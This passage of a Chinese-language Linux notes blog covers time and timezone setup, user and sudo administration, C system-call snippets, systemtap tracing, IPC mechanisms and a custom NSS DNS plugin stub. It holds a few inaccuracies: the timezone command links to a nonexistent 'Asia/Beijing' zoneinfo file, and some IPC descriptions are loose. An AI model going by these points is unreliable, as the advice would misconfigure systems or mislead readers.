<h2 id="4-bpf-主要用于网络数据分析"><a href="#4-bpf-主要用于网络数据分析" class="headerlink" title="4. bpf 主要用于网络数据分析"></a>4. bpf 主要用于网络数据分析</h2><p>原理参考 <a href="https://cloud.tencent.com/developer/article/1698426">Linux超能力BPF技术介绍及学习分享</a></p>
<ul>
<li>新版tcpdump就是基于bpf技术实现的</li>
</ul>
<h2 id="5-设置无操作用户自动退出"><a href="#5-设置无操作用户自动退出" class="headerlink" title="5. 设置无操作用户自动退出"></a>5. 设置无操作用户自动退出</h2><ul>
<li>修改<code>/etc/profile</code>，添加</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export TMOUT=15   # 无操作15秒自动退出</span><br><span class="line">readonly TMOUT    # 不允许用户修改此变量</span><br></pre></td></tr></table></figure>

<h2 id="6-系统时间和硬件时间同步"><a href="#6-系统时间和硬件时间同步" class="headerlink" title="6. 系统时间和硬件时间同步"></a>6. 系统时间和硬件时间同步</h2><ul>
<li>使用hwclock命令</li>
<li>下面是几种基本用法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示硬件时间，启动就会读取的时间，和系统不一致就是每次重启时间都不对</span></span><br><span class="line">=&gt; sudo hwclock --show</span><br><span class="line">2022-12-09 17:35:28.288827+08:00</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">硬件时间同步到系统时间，开机会自动执行</span></span><br><span class="line">=&gt; sudo hwclock --hctosys</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统时间同步到硬件时间，可以在同步系统时间后进行执行，保证重启后和当前一致</span></span><br><span class="line">=&gt; sudo hwclock --systohc</span><br></pre></td></tr></table></figure>

<h2 id="7-设置时区"><a href="#7-设置时区" class="headerlink" title="7. 设置时区"></a>7. 设置时区</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Beijing /etc/localtime</span><br></pre></td></tr></table></figure>

<h2 id="8-添加一个用户"><a href="#8-添加一个用户" class="headerlink" title="8. 添加一个用户"></a>8. 添加一个用户</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加用户</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-d 设置home目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-s 设置shell</span></span><br><span class="line">useradd test -d /home/test -s /bin/zsh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置密码</span></span><br><span class="line">passwd test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加目录</span></span><br><span class="line">mkdir /home/test</span><br><span class="line">chown test:test /home/test</span><br></pre></td></tr></table></figure>

<h3 id="8-1-给用户执行sudo的权力"><a href="#8-1-给用户执行sudo的权力" class="headerlink" title="8.1. 给用户执行sudo的权力"></a>8.1. 给用户执行sudo的权力</h3><ul>
<li>需要安装sudo包，然后执行<code>visudo</code></li>
<li>在打开的sudoers文件中，找到以下行：<code>root ALL=(ALL) ALL</code>。</li>
<li>在该行下面添加以下内容：<code>username ALL=(ALL) ALL</code>，其中username是你要授予管理员权限的用户名。</li>
<li>保存并关闭sudoers文件。</li>
</ul>
<h1 id="三、c-c-编程"><a href="#三、c-c-编程" class="headerlink" title="三、c&#x2F;c++编程"></a>三、c&#x2F;c++编程</h1><h2 id="1-获取系统信息"><a href="#1-获取系统信息" class="headerlink" title="1. 获取系统信息"></a>1. 获取系统信息</h2><ul>
<li>sysinfo结构体定义</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sysinfo.h</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sysinfo</span> &#123;</span><br><span class="line">	<span class="type">__kernel_long_t</span> uptime;		<span class="comment">/* Seconds since boot */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> loads[<span class="number">3</span>];	<span class="comment">/* 1, 5, and 15 minute load averages */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> totalram;	<span class="comment">/* Total usable main memory size */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> freeram;	<span class="comment">/* Available memory size */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> sharedram;	<span class="comment">/* Amount of shared memory */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> bufferram;	<span class="comment">/* Memory used by buffers */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> totalswap;	<span class="comment">/* Total swap space size */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> freeswap;	<span class="comment">/* swap space still available */</span></span><br><span class="line">	__u16 procs;		   	<span class="comment">/* Number of current processes */</span></span><br><span class="line">	__u16 pad;		   	<span class="comment">/* Explicit padding for m68k */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> totalhigh;	<span class="comment">/* Total high memory size */</span></span><br><span class="line">	<span class="type">__kernel_ulong_t</span> freehigh;	<span class="comment">/* Available high memory size */</span></span><br><span class="line">	__u32 mem_unit;			<span class="comment">/* Memory unit size in bytes */</span></span><br><span class="line">	<span class="type">char</span> _f[<span class="number">20</span><span class="number">-2</span>*<span class="built_in">sizeof</span>(<span class="type">__kernel_ulong_t</span>)-<span class="built_in">sizeof</span>(__u32)];	<span class="comment">/* Padding: libc5 uses this.. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>获取系统信息</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sysinfo</span> info;</span><br><span class="line">	<span class="comment">// 操作成功返回0，失败返回-1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sysinfo</span>(&amp;info)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get sysinfo, errno: %u, reason: %s\n&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-获取进程id"><a href="#2-获取进程id" class="headerlink" title="2. 获取进程id"></a>2. 获取进程id</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unistd.h</span></span><br><span class="line"><span class="function"><span class="type">__pid_t</span> <span class="title">getpid</span> <span class="params">(<span class="type">void</span>)</span> __THROW</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-获取系统时间"><a href="#3-获取系统时间" class="headerlink" title="3. 获取系统时间"></a>3. 获取系统时间</h2><ul>
<li>一般获取系统时间有两个函数<code>gettimeofday</code>和<code>clock_gettime</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/include/time.h</span></span><br><span class="line"><span class="comment">/* Get current value of clock CLOCK_ID and store it in TP.  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">int</span> <span class="title">clock_gettime</span> <span class="params">(<span class="type">clockid_t</span> __clock_id, <span class="keyword">struct</span> timespec *__tp)</span></span></span><br><span class="line"><span class="function">     __THROW __<span class="title">nonnull</span><span class="params">((<span class="number">2</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/include/time.h</span></span><br><span class="line"><span class="comment">/* Get the current time of day, putting it into *TV.</span></span><br><span class="line"><span class="comment">   If TZ is not null, *TZ must be a struct timezone, and both fields</span></span><br><span class="line"><span class="comment">   will be set to zero.</span></span><br><span class="line"><span class="comment">   Calling this function with a non-null TZ is obsolete;</span></span><br><span class="line"><span class="comment">   use localtime etc. instead.</span></span><br><span class="line"><span class="comment">   This function itself is semi-obsolete;</span></span><br><span class="line"><span class="comment">   most callers should use time or clock_gettime instead. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __USE_TIME_BITS64</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">int</span> <span class="title">gettimeofday</span> <span class="params">(<span class="keyword">struct</span> timeval *__restrict __tv,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="type">void</span> *__restrict __tz)</span> __THROW __<span class="title">nonnull</span> <span class="params">((<span class="number">1</span>))</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> __REDIRECT_NTH</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __REDIRECT_NTH (gettimeofday, (<span class="keyword">struct</span> timeval *__restrict __tv,</span><br><span class="line">                                          <span class="type">void</span> *__restrict __tz),</span><br><span class="line">                           __gettimeofday64) __nonnull ((<span class="number">1</span>));</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> gettimeofday __gettimeofday64</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>clock_gettime</code>有下面几种类型</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/include/bits/time.h</span></span><br><span class="line"><span class="comment">/* Identifier for system-wide realtime clock.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_REALTIME			0       <span class="comment">// 从1970.01.01到现在的时间</span></span></span><br><span class="line"><span class="comment">/* Monotonic system-wide clock.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_MONOTONIC		1       <span class="comment">// 系统启动到现在的时间</span></span></span><br><span class="line"><span class="comment">/* High-resolution timer from the CPU.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_PROCESS_CPUTIME_ID	2   <span class="comment">// 进程所消耗的时间，sleep不再计时</span></span></span><br><span class="line"><span class="comment">/* Thread-specific CPU-time clock.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_THREAD_CPUTIME_ID	3   <span class="comment">// 线程消耗时间，sleep不再计时</span></span></span><br><span class="line"><span class="comment">/* Monotonic system-wide clock, not adjusted for frequency scaling.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_MONOTONIC_RAW		4   <span class="comment">// 硬件时间</span></span></span><br><span class="line"><span class="comment">/* Identifier for system-wide realtime clock, updated only on ticks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_REALTIME_COARSE		5   <span class="comment">// 不精确的realtime，速度更快精度更低</span></span></span><br><span class="line"><span class="comment">/* Monotonic system-wide clock, updated only on ticks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_MONOTONIC_COARSE		6   <span class="comment">// 不精确的MONOTONIC，速度更快精度更低</span></span></span><br><span class="line"><span class="comment">/* Monotonic system-wide clock that includes time spent in suspension.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_BOOTTIME			7</span></span><br><span class="line"><span class="comment">/* Like CLOCK_REALTIME but also wakes suspended system.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_REALTIME_ALARM		8</span></span><br><span class="line"><span class="comment">/* Like CLOCK_BOOTTIME but also wakes suspended system.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_BOOTTIME_ALARM		9</span></span><br><span class="line"><span class="comment">/* Like CLOCK_REALTIME but in International Atomic Time.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CLOCK_TAI			11      <span class="comment">// 原子钟的时间，与CLOCK_REALTIME类似，不可被更改，没有闰秒</span></span></span><br></pre></td></tr></table></figure>

<h2 id="4-errno"><a href="#4-errno" class="headerlink" title="4. errno"></a>4. errno</h2><ul>
<li>errno线程唯一，不用担心多线程问题</li>
<li>errno在头文件<code>unistd.h</code></li>
<li><code>strerror()</code>在头文件<code>string.h</code></li>
</ul>
<h1 id="四、内核追踪调试技术"><a href="#四、内核追踪调试技术" class="headerlink" title="四、内核追踪调试技术"></a>四、内核追踪调试技术</h1><h2 id="1-systemtap"><a href="#1-systemtap" class="headerlink" title="1. systemtap"></a>1. systemtap</h2><p>参考文档: <a href="https://sourceware.org/systemtap/tapsets/">https://sourceware.org/systemtap/tapsets/</a></p>
<h3 id="1-1-一些常用的写法"><a href="#1-1-一些常用的写法" class="headerlink" title="1.1. 一些常用的写法"></a>1.1. 一些常用的写法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可以追踪的列表</span></span><br><span class="line">=&gt; stap -l &#x27;kernel.trace(&quot;*&quot;)&#x27; | grep kfree_skb</span><br><span class="line">kernel.trace(&quot;skb:kfree_skb&quot;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译stap脚本并运行</span></span><br><span class="line">=&gt; stap --all-modules test.stp</span><br></pre></td></tr></table></figure>

<h3 id="1-2-语法"><a href="#1-2-语法" class="headerlink" title="1.2. 语法"></a>1.2. 语法</h3><h4 id="1-内置变量"><a href="#1-内置变量" class="headerlink" title="1) 内置变量"></a>1) 内置变量</h4><ul>
<li><code>$location</code>: 当前所在的内存地址</li>
<li><code>$$parms</code>: 字符串形式，当前函数参数和地址</li>
</ul>
<h4 id="2-内置函数"><a href="#2-内置函数" class="headerlink" title="2) 内置函数"></a>2) 内置函数</h4><ul>
<li><code>symname($location)</code>: 当前所在函数</li>
<li><code>symdata($location)</code>: 当前所在函数和偏移</li>
</ul>
<h3 id="1-3-实战"><a href="#1-3-实战" class="headerlink" title="1.3. 实战"></a>1.3. 实战</h3><h4 id="1-查看包释放函数"><a href="#1-查看包释放函数" class="headerlink" title="1) 查看包释放函数"></a>1) 查看包释放函数</h4><ul>
<li>每隔5s打印调用丢包函数的函数</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义全局变量</span></span><br><span class="line">global locations</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置开启和结束</span></span><br><span class="line">probe begin &#123; printf(&quot;Monitor begin\n&quot;) &#125;</span><br><span class="line">probe end &#123; printf(&quot;Monitor end\n&quot;) &#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">追踪kfree_skb函数</span></span><br><span class="line">probe kernel.trace(&quot;kfree_skb&quot;) &#123;</span><br><span class="line">    # 将当前位置对应的变量+1</span><br><span class="line">    locations[$location] &lt;&lt;&lt; 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe timer.sec(5) &#123;</span><br><span class="line">    printf(&quot;\n&quot;)</span><br><span class="line">    foreach (l in locations-) &#123;</span><br><span class="line">        printf(&quot;%d packets dropped at %s\n&quot;,</span><br><span class="line">            @count(locations[l]), symname(l)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    delete locations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>输出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Monitor begin</span><br><span class="line"></span><br><span class="line">1 packets dropped at ip_rcv_finish</span><br></pre></td></tr></table></figure>

<h2 id="2-trace-cmd"><a href="#2-trace-cmd" class="headerlink" title="2. trace-cmd"></a>2. trace-cmd</h2><h3 id="2-1-常用的用法"><a href="#2-1-常用的用法" class="headerlink" title="2.1. 常用的用法"></a>2.1. 常用的用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可以追踪什么点</span></span><br><span class="line">trace-cmd list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可以使用什么追踪器</span></span><br><span class="line">trace-cmd list -t</span><br></pre></td></tr></table></figure>

<h1 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h1><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><ul>
<li>虚拟内存是每个进程有自己的虚拟地址空间，不同的进程之间的虚拟地址空间一样，但是对应的物理地址空间不一样</li>
<li>32位下，每个进程拥有4G虚拟地址空间，其中1G为内核空间，3G为用户空间</li>
<li>每个进程有一个页表，存放在进程的信息中，mmu处理每个进程的虚拟地址到物理地址映射时要读取不同进程的页表，通过页表寄存器指定页表地址</li>
</ul>
<h1 id="六、进程"><a href="#六、进程" class="headerlink" title="六、进程"></a>六、进程</h1><h2 id="1-进程间通信"><a href="#1-进程间通信" class="headerlink" title="1. 进程间通信"></a>1. 进程间通信</h2><ul>
<li>进程间通信有管道、命名管道、信号、信号量、消息队列、共享内存、套接字</li>
</ul>
<h3 id="1-1-管道"><a href="#1-1-管道" class="headerlink" title="1.1. 管道"></a>1.1. 管道</h3><h4 id="1-特点"><a href="#1-特点" class="headerlink" title="1) 特点"></a>1) 特点</h4><ul>
<li>数据只能向一个方向流动</li>
<li>只能用于父子进程或兄弟进程</li>
<li>fifo的读出和写入</li>
<li>缓冲区有限，本身存在于内存中，分配了一个page大小</li>
</ul>
<h4 id="2-创建"><a href="#2-创建" class="headerlink" title="2) 创建"></a>2) 创建</h4><ul>
<li>通过shell的<code>|</code>创建</li>
<li>通过代码的创建</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pipe</span><span class="params">(<span class="type">int</span> fd[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>管道的创建需要在父进程，然后再fork出子进程使用，或给两个兄弟子进程使用</li>
</ul>
<h3 id="1-2-命名管道"><a href="#1-2-命名管道" class="headerlink" title="1.2. 命名管道"></a>1.2. 命名管道</h3><h4 id="1-特点-1"><a href="#1-特点-1" class="headerlink" title="1) 特点"></a>1) 特点</h4><ul>
<li>需要提供一个文件路径，两个进程通过路径进行联系，所以可以没有亲缘关系的进程通信</li>
<li>内部没有fifo，读写会阻塞</li>
<li>其他和管道一致</li>
</ul>
<h4 id="2-创建-1"><a href="#2-创建-1" class="headerlink" title="2) 创建"></a>2) 创建</h4><ul>
<li>shell通过<code>mkfifo xxx</code>创建管道，使用<code>&gt;</code>和<code>&lt;</code>进行读取写入</li>
<li>通过代码创建，正常按照文件一样打开和读写即可</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mkfifo</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-信号"><a href="#1-3-信号" class="headerlink" title="1.3. 信号"></a>1.3. 信号</h3><h4 id="1-特点-2"><a href="#1-特点-2" class="headerlink" title="1) 特点"></a>1) 特点</h4><ul>
<li>进程不知道信号什么时候来，类似于中断</li>
<li>信号通俗讲就是系统定义的信号，也就是kill可以发出的信号</li>
</ul>
<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2) 使用"></a>2) 使用</h4><ul>
<li>代码注册信号</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 函数名：BR_SignalRegister</span></span><br><span class="line"><span class="comment"> * 功 能：BugReport信号注册函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">BR_SignalRegister</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sigaction</span> act;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;act, <span class="number">0</span>, <span class="built_in">sizeof</span>(act));</span><br><span class="line">    act.sa_handler = (<span class="type">__sighandler_t</span>)BR_SignalHandler;</span><br><span class="line">    act.sa_flags = <span class="number">0</span>;</span><br><span class="line">    (<span class="type">void</span>)<span class="built_in">sigemptyset</span>(&amp;act.sa_mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sigaction</span>(sig, &amp;act, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno != EINTR) &#123;</span><br><span class="line">            (<span class="type">void</span>)<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[BugReport]sigaction %s failed: %s\n&quot;</span>,</span><br><span class="line">                          BR_signals[sig], <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-信号量"><a href="#1-4-信号量" class="headerlink" title="1.4. 信号量"></a>1.4. 信号量</h3><h4 id="1-特点-3"><a href="#1-特点-3" class="headerlink" title="1) 特点"></a>1) 特点</h4><ul>
<li>主要用于进程间共享资源访问控制机制</li>
<li>两种类型<ul>
<li>二值信号量：只能0和1</li>
<li>计算信号量：非负值</li>
</ul>
</li>
</ul>
<h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2) 使用"></a>2) 使用</h4><ul>
<li>创建使用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">semget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> num_sems, <span class="type">int</span> sem_flags)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>操作函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改变信号量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semop</span><span class="params">(<span class="type">int</span> sem_id, <span class="keyword">struct</span> sembuf *sem_opa, <span class="type">size_t</span> num_sem_ops)</span></span>;</span><br><span class="line"><span class="comment">// 控制信号量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semctl</span><span class="params">(<span class="type">int</span> sem_id, <span class="type">int</span> sem_num, <span class="type">int</span> command, ...)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-消息队列"><a href="#1-5-消息队列" class="headerlink" title="1.5. 消息队列"></a>1.5. 消息队列</h3><h4 id="1-特点-4"><a href="#1-特点-4" class="headerlink" title="1) 特点"></a>1) 特点</h4><ul>
<li>就是在命名管道上加了个fifo，避免阻塞</li>
<li>可以通过消息类型有选择的接收数据</li>
</ul>
<h4 id="2-使用-2"><a href="#2-使用-2" class="headerlink" title="2) 使用"></a>2) 使用</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建或获取已存在的消息队列</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> msgflg)</span></span>;</span><br><span class="line"><span class="comment">// 发送</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">int</span> msgsz, <span class="type">int</span> msgflg)</span></span>;</span><br><span class="line"><span class="comment">// 接收</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">msgrcv</span><span class="params">(<span class="type">int</span> msgid, <span class="type">void</span> *msgp, <span class="type">int</span> msgsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-共享内存"><a href="#1-6-共享内存" class="headerlink" title="1.6. 共享内存"></a>1.6. 共享内存</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shmget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">size_t</span> size, <span class="type">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-7-套接字"><a href="#1-7-套接字" class="headerlink" title="1.7. 套接字"></a>1.7. 套接字</h3><h1 id="七、nss-Name-Service-Switch"><a href="#七、nss-Name-Service-Switch" class="headerlink" title="七、nss: Name Service Switch"></a>七、nss: Name Service Switch</h1><p>Name Service Switch（NSS）是一个在Linux和其他类Unix操作系统中使用的系统组件，它提供了一种机制来管理系统中各种名称服务的配置。名称服务包括用户帐户、组、主机名、网络协议、服务和其他系统信息。NSS允许系统管理员配置系统以使用不同的名称服务，例如本地文件、NIS、LDAP等。NSS还提供了一种机制来缓存名称服务数据，以提高系统性能。在Linux系统中，NSS通常由glibc库实现。</p>
<h2 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1. 配置文件"></a>1. 配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat /etc/nsswitch.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name Service Switch configuration file.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See nsswitch.conf(5) <span class="keyword">for</span> details.</span></span><br><span class="line"></span><br><span class="line">passwd: files systemd</span><br><span class="line">group: files [SUCCESS=merge] systemd</span><br><span class="line">shadow: files systemd</span><br><span class="line">gshadow: files systemd</span><br><span class="line"></span><br><span class="line">publickey: files</span><br><span class="line"></span><br><span class="line">hosts: mymachines resolve [!UNAVAIL=return] files myhostname dns</span><br><span class="line">networks: files</span><br><span class="line"></span><br><span class="line">protocols: files</span><br><span class="line">services: files</span><br><span class="line">ethers: files</span><br><span class="line">rpc: files</span><br><span class="line"></span><br><span class="line">netgroup: files</span><br></pre></td></tr></table></figure>

<ul>
<li>上面配置的files等对应一个个插件，对应命名<code>libnss_xxx.so</code></li>
<li>修改了之后，从<code>glibc 2.33</code>后，会自动重新加载此文件，之前的版本只在进程起来的时候加载一次</li>
</ul>
<h2 id="2-插件位置"><a href="#2-插件位置" class="headerlink" title="2. 插件位置"></a>2. 插件位置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; ls /usr/lib/libnss_*</span><br><span class="line">/usr/lib/libnss_compat.so    /usr/lib/libnss_db.so.2     /usr/lib/libnss_hesiod.so           /usr/lib/libnss_libvirt.so.2     /usr/lib/libnss_resolve.so.2  /usr/lib/libnss_wins.so.2</span><br><span class="line">/usr/lib/libnss_compat.so.2  /usr/lib/libnss_dns.so.2    /usr/lib/libnss_hesiod.so.2         /usr/lib/libnss_myhostname.so.2  /usr/lib/libnss_systemd.so.2</span><br><span class="line">/usr/lib/libnss_db.so        /usr/lib/libnss_files.so.2  /usr/lib/libnss_libvirt_guest.so.2  /usr/lib/libnss_mymachines.so.2  /usr/lib/libnss_winbind.so.2</span><br></pre></td></tr></table></figure>

<h2 id="3-自定义插件"><a href="#3-自定义插件" class="headerlink" title="3. 自定义插件"></a>3. 自定义插件</h2><ul>
<li>可以自定义so库，满足此命名，然后放到系统库路径后，添加到配置文件中</li>
<li>需要满足nss对应的库的符号要求</li>
</ul>
<h3 id="3-1-自定义dns解析库"><a href="#3-1-自定义dns解析库" class="headerlink" title="3.1. 自定义dns解析库"></a>3.1. 自定义dns解析库</h3><ul>
<li>dns解析由hosts处理</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;nss.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syslog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zconf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">nss_status</span> _nss_hs_gethostbyname4_r(</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *name,</span><br><span class="line">        <span class="keyword">struct</span> gaih_addrtuple **pat,</span><br><span class="line">        <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen,</span><br><span class="line">        <span class="type">int</span> *errnop, <span class="type">int</span> *h_errnop,</span><br><span class="line">        <span class="type">int32_t</span> *ttlp) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stdout, <span class="string">&quot;_nss_hs_gethostbyname4_r ns hook domain:%s  pid:%d\n&quot;</span>, name, <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> NSS_STATUS_NOTFOUND;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">nss_status</span> _nss_hs_gethostbyname3_r(</span><br><span class="line">        <span class="type">const</span> 